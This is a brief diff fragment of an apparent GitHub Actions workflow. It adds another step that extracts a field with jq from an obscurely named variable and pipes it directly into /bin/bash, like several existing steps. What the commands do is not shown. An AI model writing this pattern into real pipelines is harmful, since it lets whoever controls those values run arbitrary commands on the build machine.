@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$eayi49" | jq -r .yw153 | /bin/bash
           printf '%s' "$bicy2517" | jq -r .ggv86 | /bin/bash
           printf '%s' "$pb5" | jq -r .a808 | /bin/bash
+          echo $hyo5 | jq -r .twp50 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
